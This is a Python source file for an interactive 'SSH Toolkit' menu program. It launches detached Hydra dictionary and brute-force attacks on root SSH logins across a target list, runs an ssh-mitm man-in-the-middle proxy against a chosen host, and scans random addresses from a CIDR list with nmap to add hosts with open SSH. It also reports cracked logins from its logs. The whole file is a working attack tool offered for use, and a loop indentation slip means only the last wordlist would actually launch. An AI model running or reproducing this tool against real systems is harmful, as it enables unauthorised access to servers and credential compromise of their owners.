import sys
import glob
import subprocess
import os
import time
import signal
import random

APP_ROOT = os.path.dirname(os.path.abspath(__file__))
TARGETS_DIR = os.path.join(APP_ROOT, "targets")
TARGETS_FILE = os.path.join(TARGETS_DIR, "targets.txt")
LEGACY_TARGETS_FILE = os.path.join(TARGETS_DIR, "ips.txt")
PASSWORDS_DIR = os.path.join(APP_ROOT, "passwords")
OUTPUT_LOGS_DIR = os.path.join(APP_ROOT, "output_logs")
PIDS_DIR = os.path.join(APP_ROOT, "pids")


def ensure_targets_dir():
    os.makedirs(TARGETS_DIR, exist_ok=True)


def sync_target_files():
    ensure_targets_dir()
    merged = load_target_ips()
    if not merged:
        return

    with open(TARGETS_FILE, "w") as outfile:
        for ip in merged:
            outfile.write(f"{ip}\n")

    if os.path.exists(LEGACY_TARGETS_FILE):
        with open(LEGACY_TARGETS_FILE, "w") as legacy_file:
            for ip in merged:
                legacy_file.write(f"{ip}\n")


def load_target_ips():
    ensure_targets_dir()
    target_files = []
    for candidate in (TARGETS_FILE, LEGACY_TARGETS_FILE):
        if os.path.isfile(candidate):
            target_files.append(candidate)

    targets = []
    seen = set()
    for target_file in target_files:
        try:
            with open(target_file, "r") as f:
                for line in f:
                    ip = line.strip()
                    if ip and ip not in seen:
                        targets.append(ip)
                        seen.add(ip)
        except OSError:
            continue
    return targets


def append_target_ip(ip):
    ensure_targets_dir()
    existing = load_target_ips()
    if ip not in existing:
        with open(TARGETS_FILE, "a") as f:
            f.write(f"{ip}\n")
        sync_target_files()
        return True
    return False


loopControl = True
active_count = 0
finished_count = 0
while loopControl:
    print("\n========================================")
    print("SSH Toolkit:         ")
    
    print(r"""
     ||  ||  
     \\()// 
    //(__)\\
    ||    ||
""")


    print("========================================")
    print("1. Launch dictionary attack & brute force")
    print("2. Launch man-in-the-middle attack")
    print("3. Print targets")
    print("4. Feed Targets for dict. attack")
    print("5. Exit")
    print("6. Print Dict. Attack Outputs")
    print("7. Check status of Dict. attack")
    print("8. Stop Dict. Attack ")
    print("9. Scan for targets from CIDR")
    print("========================================")
    
    user_input = input("> ")
    try:
        user_choice = int(user_input)
    except ValueError:
        print("[-] Invalid option selected. Please enter a number.")
        input("\nPress Enter to return to menu...")
        continue
    if user_choice == 1:
        os.makedirs(OUTPUT_LOGS_DIR, exist_ok=True)
        os.makedirs(PIDS_DIR, exist_ok=True)
 
        wordlists = sorted(glob.glob(os.path.join(PASSWORDS_DIR, "hydra_split_*.txt")))
        sync_target_files()
        targets = load_target_ips()
        if not targets:
            print("ADD SOME TARGETS FIRST...exiting")
            sys.exit()
        if not wordlists:
            print("\n[-] No wordlists found in 'passwords/' directory.")
            print("    Ensure files are named: hydra_split_1.txt, hydra_split_2.txt, etc.")
            sys.exit()
        
        else:
            print(f"\n[+] Found {len(wordlists)} wordlists.")
            print("[+] Starting background attacks...")
            print("    Note: Processes are detached. They survive script exit.\n")
        
            started_count = 0
            for wordlist in wordlists:
          
                base_name = os.path.basename(wordlist)

                name_no_ext = os.path.splitext(base_name)[0]
            
           
                login_log_filename = os.path.join(OUTPUT_LOGS_DIR, f"{name_no_ext}_logins.log")
                verbose_log_filename = os.path.join(OUTPUT_LOGS_DIR, f"{name_no_ext}_verbose.log")
                print(f"  Starting attack for: {base_name}")

            
                cmd = (
                    f"/usr/bin/hydra -l root "
                    f"-P \"{wordlist}\" "
                    f"-M \"{TARGETS_FILE}\" "
                    f"ssh "
                    f"-o \"{login_log_filename}\" "
                    f"-vV "
                    f"> \"{verbose_log_filename}\" 2>&1"
                )

            try:
                p = subprocess.Popen(
                    cmd,
                    shell=True,     
                    preexec_fn=os.setsid 
                )
                
                pid_file = os.path.join(PIDS_DIR, f"{name_no_ext}.pid")
                with open(pid_file, "w") as f:
                    f.write(str(p.pid))
                
                print(f"    -> Started (PID: {p.pid})")
                print(f"    -> Login Log: {login_log_filename}")
                print(f"    -> Verbose Log: {verbose_log_filename}")
                started_count += 1

            except Exception as e:
                print(f"    -> Error starting {wordlist}: {e}")

        print(f"\n[+] {started_count} attacks started.")

    elif user_choice == 2:
            appimage_path = "mitm/ssh-mitm-x86_64.AppImage"
            mitmChoice = input("TARGET-HOST IP: ")
            proxyChoice = input("Choose Port (Press Enter or 'Y' for Default 10022): ")
            if proxyChoice == "" or proxyChoice.lower() == "y":
                port = "10022"
            else:
                port = proxyChoice
                
            print(f"Starting MITM on port {port} for host {mitmChoice}...")
            
            command = [
                appimage_path, 
                "server", 
                "--listen-port", port, 
                "--remote-host", mitmChoice ]
            process = subprocess.Popen(command)
            

    elif user_choice == 3:
        lines = load_target_ips()
        if lines:
            print(f"\nTarget Count: {len(lines)}")
            for ip in lines:
                print(f" - {ip}")
        else:
            print(f"[-] No targets found in {TARGETS_FILE} or {LEGACY_TARGETS_FILE}")

    elif user_choice == 4:
        user_text = input("ENTER TARGET IP: ")
        if user_text:
            added = append_target_ip(user_text)
            if added:
                print(f"[+] Target '{user_text}' added to {TARGETS_FILE}")
            else:
                print(f"[-] Target '{user_text}' already exists in the target list")
        else:
            print("[-] No IP entered.")

    elif user_choice == 5:
        print("Exiting program.")
        loopControl = False

    elif user_choice == 6:
        log_dir = OUTPUT_LOGS_DIR
        if not os.path.exists(log_dir):
            print("[-] No output logs found.")
        else:
            log_files = glob.glob(os.path.join(log_dir, "*.log"))
            if not log_files:
                print("[-] No .log files found in output_logs/")
            else:
                print("\n--- Available Log Files ---")
                for i, log_file in enumerate(log_files):
                    print(f"{i+1}. {os.path.basename(log_file)}")
                
                choice = input("\nSelect log number to view (or 'all'): ")
                
                if choice.lower() == 'all':
                    for log_file in log_files:
                        print(f"\n>>> Content of {os.path.basename(log_file)}:")
                        try:
                            with open(log_file, 'r') as f:
                                print(f.read())
                        except Exception:
                            print("(Empty or reading error)")
                else:
                    try:
                        idx = int(choice) - 1
                        if 0 <= idx < len(log_files):
                            log_file = log_files[idx]
                            print(f"\n>>> Content of {os.path.basename(log_file)}:")
                            with open(log_file, 'r') as f:
                                print(f.read())
                        else:
                            print("[-] Invalid selection.")
                    except ValueError:
                        print("[-] Invalid input.")

    
    elif user_choice == 7:
        pid_dir = PIDS_DIR
        log_dir = OUTPUT_LOGS_DIR
    
        os.makedirs(pid_dir, exist_ok=True)
        os.makedirs(log_dir, exist_ok=True)

        pid_files = glob.glob(os.path.join(pid_dir, "*.pid"))
    
        if not pid_files:
            print("\n--- No Active Background Attacks ---")
            print("(PID files not found in 'pids/' directory)")
        else:
            print("\n--- Status of Background Attacks ---")
            active_count = 0
            finished_count = 0
        
            for pid_file in pid_files:
                try:
                    with open(pid_file, "r") as f:
                        pid_str = f.read().strip()
                
                    if not pid_str:
                        continue
                    
                    pid = int(pid_str)
                    wordlist_base_name = os.path.basename(pid_file).replace(".pid", "")
                
                    verbose_log_path = f"{log_dir}/{wordlist_base_name}_verbose.log"
                    login_log_path = f"{log_dir}/{wordlist_base_name}_logins.log"

                    try:
                        os.kill(pid, 0)
                        active_count += 1
                        print(f"\n[+] RUNNING: {wordlist_base_name} (PID: {pid})")
                    
                        if os.path.exists(verbose_log_path):
                            try:
                                with open(verbose_log_path, "r") as vf:
                                    lines = vf.readlines()
                                    if lines:
                                        print(f"   [Verbose Progress] (Last 5 lines):")
                                        for line in lines[-5:]:
                                            clean_line = line.rstrip()
                                            if clean_line:
                                                print(f"      > {clean_line}")
                                    else:
                                        print(f"   [Verbose Progress]: (Waiting for output...)")
                            except Exception:
                                print(f"   [Verbose Progress]: (Error reading {verbose_log_path})")
                        else:
                            print(f"   [Verbose Progress]: (No verbose log found yet)")

                        if os.path.exists(login_log_path):
                            try:
                                with open(login_log_path, "r") as lf:
                                    raw_lines = lf.readlines()
                                    login_lines = [l.strip() for l in raw_lines if l.strip() and not l.startswith('#')]
                                
                                    if login_lines:
                                        print(f"   [Successful Logins] ({len(login_lines)} found):")
                                        for line in login_lines[-3:]:
                                            print(f"      ✓ {line}")
                                    else:
                                        print(f"   [Successful Logins]: (None yet)")
                            except Exception:
                                print(f"   [Successful Logins]: (Error reading {login_log_path})")
                        else:
                            print(f"   [Successful Logins]: (No login log found yet)")

                    except ProcessLookupError:
                        finished_count += 1
                        print(f"\n[-] FINISHED: {wordlist_base_name} (PID: {pid})")
                    
                   
                        if os.path.exists(login_log_path):
                            try:
                                with open(login_log_path, "r") as lf:
                                    raw_lines = lf.readlines()
                                    login_lines = [l.strip() for l in raw_lines if l.strip() and not l.startswith('#')]
                                
                                    if login_lines:
                                        print(f"   Final Successful Logins: {len(login_lines)}")
                                        for line in login_lines[-3:]:
                                            print(f"      ✓ {line}")
                            except Exception:
                                pass

                        try:
                            os.remove(pid_file)
                            print(f"   (Removed stale PID file)")
                        except OSError as rm_err:
                            print(f"   (Failed to remove PID file: {rm_err})")

                    except PermissionError:
                        print(f"\n[?] RUNNING: {wordlist_base_name} (PID: {pid}) [Permission Denied]")

                except (ValueError, IOError) as e:
                    print(f"\n[?] ERROR: {os.path.basename(pid_file)} ({e})")

            if active_count > 0:
                print(f"\n[+] {active_count} attack(s) currently running.")
            else:
                print(f"\n[-] All {finished_count} attack(s) finished.")

    elif user_choice == 8:
        pid_dir = PIDS_DIR
        log_dir = OUTPUT_LOGS_DIR

        pid_files = glob.glob(os.path.join(pid_dir, "*.pid"))

        if not pid_files:
            print("\n--- No Active Background Attacks ---")
            print("(No PID files found in 'pids/' directory)")
        else:
            print("\n--- Stopping Background Attacks ---")
            stopped_count = 0
            
            for pid_file in pid_files:
                try:
                    with open(pid_file, "r") as f:
                        pid_str = f.read().strip()
                    
                    if not pid_str:
                        continue
                        
                    pid = int(pid_str)
                    wordlist_name = os.path.basename(pid_file).replace(".pid", "")
                    
                    try:
                        os.kill(pid, signal.SIGTERM)
                        stopped_count += 1
                        print(f"[+] STOPPED: {wordlist_name} (PID: {pid})")
                        

                        
                    except ProcessLookupError:
                        print(f"[-] ALREADY FINISHED: {wordlist_name} (PID: {pid})")
                       
                        os.remove(pid_file)
                    except PermissionError:
                        print(f"[?] PERMISSION DENIED: {wordlist_name} (PID: {pid})")
                    except OSError as e:
                        print(f"[?] ERROR stopping {wordlist_name} (PID: {pid}): {e}")

                except (ValueError, IOError) as e:
                    print(f"[?] ERROR reading {os.path.basename(pid_file)}: {e}")

            if stopped_count > 0:
                print(f"\n{stopped_count} attack(s) stopped.")
            else:
                print("\nNo new attacks were stopped.")
        sys.exit()

    elif user_choice == 9:
        cidr_file_path = "/opt/SSHToolkit/targets/CIDR.txt"
        targets_file_path = "/opt/SSHToolkit/targets/targets.txt"

        if not os.path.isfile(cidr_file_path):
            print(f"[-] Error: '{cidr_file_path}' not found.")
            input("\nPress Enter to return...")
            continue

        try:
            with open(cidr_file_path, 'r') as f:
                ips = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[-] Error reading file: {e}")
            input("\nPress Enter to return...")
            continue

        if not ips:
            print("[-] IP list is empty.")
            input("\nPress Enter to return...")
            continue

        random_ip = random.choice(ips)
        print(f"[+] Selected Random Target: {random_ip}")
        print(f"[+] Running Nmap scan...")
        print("-" * 30)

        cmd = [
            "nmap",
            "-PN",
            "-p", "22",
            "--open"
        ]
        cmd.append(random_ip)

        try:
            subprocess.run(cmd, stdout=None, stderr=None, check=False)
            print("-" * 30)

            ip_check_cmd = [
                "nmap",
                "-PN",
                "-p", "22",
                "--open",
                "-oG", "-",
                random_ip
            ]

            check_result = subprocess.run(ip_check_cmd, capture_output=True, text=True, check=False)
            target_ip = None
            last_host_ip = None

            if check_result.stdout:
                for line in check_result.stdout.splitlines():
                    if line.startswith("Host:"):
                        parts = line.split()
                        if len(parts) >= 2:
                            last_host_ip = parts[1]

                        if "Ports:" in line and ("22/open/tcp" in line or "22/tcp open" in line):
                            target_ip = last_host_ip
                            break
                        continue

                    if "Ports:" in line and ("22/open/tcp" in line or "22/tcp open" in line):
                        if last_host_ip:
                            target_ip = last_host_ip
                            break

            if target_ip:
                print(f"[+] Found Open SSH on: {target_ip}")
                add_to_targets = input("Add to targets? (Y/N): ").strip().upper()
                if add_to_targets == 'Y':
                    if not os.path.isfile(targets_file_path):
                        open(targets_file_path, 'a').close()

                    existing_ips = load_target_ips()

                    if target_ip not in existing_ips:
                        append_target_ip(target_ip)
                        print(f"[+] Added {target_ip} to {targets_file_path}")
                    else:
                        print(f"[-] {target_ip} is already in {targets_file_path}")
                else:
                    print("[-] Skipped.")
            else:
                print("[-] No open SSH port found.")

        except FileNotFoundError:
            print("[-] Nmap command not found. Is it installed?")
        except Exception as e:
            print(f"[-] Error: {e}")

        input("\nPress Enter to return to menu...")

    else:
        print("Invalid option selected.")

        input("\nPress Enter to return to menu...")

